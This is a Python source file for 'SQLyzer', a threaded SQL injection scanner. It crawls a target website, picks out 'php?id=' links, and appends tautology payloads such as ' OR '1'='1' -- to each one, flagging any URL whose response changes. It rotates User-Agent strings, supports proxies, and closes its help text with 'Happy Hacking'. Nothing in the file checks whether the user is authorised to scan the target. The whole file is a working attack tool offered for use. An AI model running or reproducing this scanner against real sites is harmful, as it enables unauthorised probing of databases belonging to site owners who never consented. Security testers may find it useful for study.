import os
import requests
import random
import threading
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore, Style, init
from tqdm import tqdm
import argparse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich import box
from rich.progress import Progress, SpinnerColumn, TextColumn
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# Initialize colorama
init(autoreset=True)

# Initialize rich console
console = Console()

# Branding
TOOL_NAME = "SQLyzer 🕵️‍♂️"
VERSION = "1.0"
AUTHOR = "Darkstarbdx"
GITHUB = "https://github.com/darkstarbdx"

def clear_screen():
    """Clear the terminal screen."""
    os.system("cls" if os.name == "nt" else "clear")

# SQL Injection payloads (default)
DEFAULT_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    '" OR "1"="1',
    '" OR "1"="1" --',
    '" OR "1"="1" #',
    '" OR "1"="1" /*',
]

# List of 100 User-Agent strings
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
    # Add the rest of the 95 User-Agent strings here...
]

def get_random_user_agent():
    """Return a random User-Agent string."""
    return random.choice(USER_AGENTS)

def get_all_links(url, headers, proxies):
    """Fetch all links from a given URL using requests."""
    try:
        response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
        response.raise_for_status()  # Raise an error for bad status codes
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()
        for link in soup.find_all("a", href=True):
            full_url = urljoin(url, link["href"])
            links.add(full_url)
        return links
    except requests.exceptions.RequestException as e:
        console.print(f"[red]❌ Error fetching links from {url}: {e}[/red]")
        return set()

def get_all_links_advanced(url):
    """Fetch all links from a JavaScript-heavy website using Selenium."""
    try:
        # Set up Selenium options
        options = Options()
        options.add_argument("--headless")  # Run in headless mode
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument(f"user-agent={get_random_user_agent()}")

        # Set up WebDriver
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        driver.get(url)

        # Wait for the page to load (adjust timeout as needed)
        driver.implicitly_wait(10)

        # Extract all links
        links = set()
        for element in driver.find_elements(By.TAG_NAME, "a"):
            href = element.get_attribute("href")
            if href:
                full_url = urljoin(url, href)
                links.add(full_url)

        driver.quit()
        return links
    except Exception as e:
        console.print(f"[red]❌ Error fetching links from {url} using Selenium: {e}[/red]")
        return set()

def find_php_id_urls(urls):
    """Filter URLs containing 'php?id=' parameters."""
    php_id_urls = set()
    for url in urls:
        if "php?id=" in url:
            php_id_urls.add(url)
    return php_id_urls

def test_sql_injection(url, payloads, headers, proxies, results, verbose=False):
    """Test a URL for SQL injection vulnerabilities."""
    try:
        original_response = requests.get(url, headers=headers, proxies=proxies, timeout=10).text
        for payload in payloads:
            test_url = f"{url}{payload}"
            test_response = requests.get(test_url, headers=headers, proxies=proxies, timeout=10).text
            if test_response != original_response:
                results.append((url, payload))
                if verbose:
                    console.print(f"[green]✅ Vulnerable: {test_url}[/green]")
                break
    except requests.exceptions.RequestException as e:
        if verbose:
            console.print(f"[red]❌ Error testing {url}: {e}[/red]")

def save_results(results, file_path):
    """Save the scan results to a text file with great formatting."""
    with open(file_path, "w", encoding="utf-8") as file:  # Add encoding="utf-8"
        file.write(f"🔍 {TOOL_NAME} - SQL Injection Vulnerability Scan Results\n")
        file.write("=" * 60 + "\n\n")
        file.write(f"📌 Version: {VERSION}\n")
        file.write(f"👤 Author: {AUTHOR}\n")
        file.write(f"🌐 GitHub: {GITHUB}\n")
        file.write("=" * 60 + "\n\n")
        if results:
            file.write("🚨 Vulnerable URLs:\n")
            file.write("-" * 60 + "\n")
            for url, payload in results:
                file.write(f"🔗 URL: {url}\n")
                file.write(f"💣 Payload: {payload}\n")
                file.write("-" * 60 + "\n")
        else:
            file.write("🟢 No SQL injection vulnerabilities found.\n")
        file.write("\n✅ Scan completed.\n")
        
def scan_target(url, payloads, proxies, verbose=False, threads=10, output_file=None, advanced_crawl=False):
    """Scan a target URL for SQL injection vulnerabilities."""
    console.print(f"[cyan]🔍 Scanning target: {url}[/cyan]")
    headers = {"User-Agent": get_random_user_agent()}

    # Step 1: Collect all links
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        transient=True,
    ) as progress:
        task = progress.add_task("[cyan]🌐 Fetching links...", total=1)
        if advanced_crawl:
            links = get_all_links_advanced(url)
        else:
            links = get_all_links(url, headers, proxies)
        progress.update(task, completed=1)

    if not links:
        console.print("[red]❌ No links found or unable to fetch links from the target site.[/red]")
        return

    # Step 2: Filter URLs with 'php?id='
    php_id_urls = find_php_id_urls(links)
    console.print(f"[yellow]📂 Found {len(php_id_urls)} URLs with 'php?id=' parameter.[/yellow]")

    # Step 3: Test for SQL injection (multi-threaded)
    results = []
    threads_list = []
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        transient=True,
    ) as progress:
        task = progress.add_task("[cyan]🔬 Testing URLs for SQL injection...", total=len(php_id_urls))
        for test_url in php_id_urls:
            thread = threading.Thread(
                target=test_sql_injection,
                args=(test_url, payloads, headers, proxies, results, verbose),
            )
            threads_list.append(thread)
            thread.start()

            # Limit the number of active threads
            if len(threads_list) >= threads:
                for t in threads_list:
                    t.join()
                threads_list = []
                progress.update(task, advance=threads)

        # Join remaining threads
        for t in threads_list:
            t.join()
        progress.update(task, advance=len(threads_list))

    # Step 4: Display results
    if results:
        console.print("[cyan]\n🚨 Scan Results:[/cyan]")
        table = Table(title=f"{TOOL_NAME} - Vulnerable URLs", show_header=True, header_style="bold magenta")
        table.add_column("🔗 URL", style="cyan")
        table.add_column("💣 Payload", style="green")
        for url, payload in results:
            table.add_row(url, payload)
        console.print(table)
    else:
        console.print("[green]🟢 No SQL injection vulnerabilities found.[/green]")

    # Step 5: Save results to a file
    if output_file:
        save_results(results, output_file)
        console.print(f"[green]📁 Results saved to {output_file}[/green]")

def load_custom_payloads(file_path):
    """Load custom payloads from a file."""
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        console.print(f"[red]❌ Error loading custom payloads: {e}[/red]")
        return []

def display_help():
    """Display a colorful and modern help menu."""
    console.print(Panel.fit(f"[bold magenta]🔍 {TOOL_NAME} - SQL Injection Vulnerability Scanner[/bold magenta]", border_style="cyan"))
    console.print(f"📌 Version: [bold yellow]{VERSION}[/bold yellow]")
    console.print(f"👤 Author: [bold cyan]{AUTHOR}[/bold cyan]")
    console.print(f"🌐 GitHub: [bold green]{GITHUB}[/bold green]")
    console.print("\nA powerful tool to scan for SQL injection vulnerabilities in web applications.\n")

    # Options Table
    table = Table(show_header=True, header_style="bold green", box=box.ROUNDED)
    table.add_column("⚙️ Option", style="cyan")
    table.add_column("📝 Description", style="yellow")
    table.add_column("💡 Example", style="green")

    table.add_row("-u, --url", "Target URL to scan", "[cyan]python sql_scanner.py -u https://example.com[/cyan]")
    table.add_row("-p, --payloads", "Path to a file containing custom payloads", "[cyan]python sql_scanner.py -p payloads.txt[/cyan]")
    table.add_row("-x, --proxy", "Proxy to use for requests", "[cyan]python sql_scanner.py -x http://127.0.0.1:8080[/cyan]")
    table.add_row("-v, --verbose", "Enable verbose output", "[cyan]python sql_scanner.py -v[/cyan]")
    table.add_row("-t, --threads", "Number of threads to use (default: 10)", "[cyan]python sql_scanner.py -t 20[/cyan]")
    table.add_row("-o, --output", "Save results to a file", "[cyan]python sql_scanner.py -o results.txt[/cyan]")
    table.add_row("-a, --advanced", "Use advanced crawling for JavaScript-heavy sites", "[cyan]python sql_scanner.py -a[/cyan]")
    table.add_row("-h, --help", "Show this help menu", "[cyan]python sql_scanner.py -h[/cyan]")

    console.print(table)

    # Footer
    console.print("\n[bold yellow]💡 Example Usage:[/bold yellow]")
    console.print(f"[cyan]python sql_scanner.py -u https://example.com -p payloads.txt -x http://127.0.0.1:8080 -v -t 20 -o results.txt -a[/cyan]")
    console.print(f"\n[bold green]🚀 Happy Hacking with {TOOL_NAME}! 🚀[/bold green]")

def main():
    """Main function to handle user input and start the scan."""
    # Clear the terminal screen
    clear_screen()

    parser = argparse.ArgumentParser(description=f"🔍 {TOOL_NAME} - SQL Injection Vulnerability Scanner", add_help=False)
    parser.add_argument("-u", "--url", help="Target URL to scan")
    parser.add_argument("-p", "--payloads", help="Path to a file containing custom payloads")
    parser.add_argument("-x", "--proxy", help="Proxy to use for requests (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use (default: 10)")
    parser.add_argument("-o", "--output", help="Save results to a file")
    parser.add_argument("-a", "--advanced", action="store_true", help="Use advanced crawling for JavaScript-heavy sites")
    parser.add_argument("-h", "--help", action="store_true", help="Show this help menu")

    args = parser.parse_args()

    if args.help or not any(vars(args).values()):
        display_help()
        return

    if not args.url:
        console.print("[red]❌ Error: Target URL is required. Use -h for help.[/red]")
        return

    # Load payloads
    if args.payloads:
        payloads = load_custom_payloads(args.payloads)
        if not payloads:
            console.print("[yellow]📝 Using default payloads.[/yellow]")
            payloads = DEFAULT_PAYLOADS
    else:
        payloads = DEFAULT_PAYLOADS

    # Set proxy
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    # Start scan
    scan_target(args.url, payloads, proxies, args.verbose, args.threads, args.output, args.advanced)

if __name__ == "__main__":
    main()